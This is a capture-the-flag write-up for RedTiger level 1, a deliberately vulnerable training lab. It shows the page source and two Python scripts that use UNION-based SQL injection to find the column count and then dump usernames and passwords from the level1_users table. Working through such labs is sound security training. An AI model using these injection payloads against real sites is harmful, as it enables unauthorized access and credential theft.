================================================================================================================
[redtiger] level1
================================================================================================================

.. graphviz::

    digraph G {
        rankdir="LR";
        node[shape="point"];
        edge[arrowhead="none"]

        {
            rank="same";
            "client"[shape="plaintext"];
            "client" -> step0 -> step2 -> step4;
        }

        {
            rank="same";
            "server"[shape="plaintext"];
            "server" -> step1 -> step3 -> step5;
        }
        step0 -> step1[label="level1.php?cat=1 union select 1,2,username,password from level1_users",arrowhead="normal"];
        step3 -> step2[label="@solve",arrowhead="normal"];
    }

|

Source analysis
================================================================================================================

Target: Get the login for the user Hornoxe 

Hint: You really need one? omg -_- 

Tablename: level1_users

.. code-block:: html

    <br>Category: <a href="?cat=1">1</a>
    This category does not exist! 
    <form method="post">
    Username: <input type="text" name="user"><br>
    Password: <input type="text" name="password">
    <input type="submit" name="login" value="Login">
    </form>
    

|

Column Length
================================================================================================================

.. code-block:: python

    import requests

    requests.packages.urllib3.disable_warnings()

    url = "https://redtiger.labs.overthewire.org/level1.php"

    n = 0
    ret = ''
    for l in range(20):
        params = {
            "cat": "1 union select %s from level1_users" % str(n)
        }
        print params.values()[0]
        n = str(n) + "," + str(l+1)
        r = requests.get(url, params=params, verify=False)
        print r.content

|

Data Extract
================================================================================================================

.. code-block:: python

    import requests

    requests.packages.urllib3.disable_warnings()

    url = "https://redtiger.labs.overthewire.org/level1.php"

    params = {
        "cat": "1 union select 1,2,username,password from level1_users"
    }

    r = requests.get(url, params=params, verify=False)
    print r.content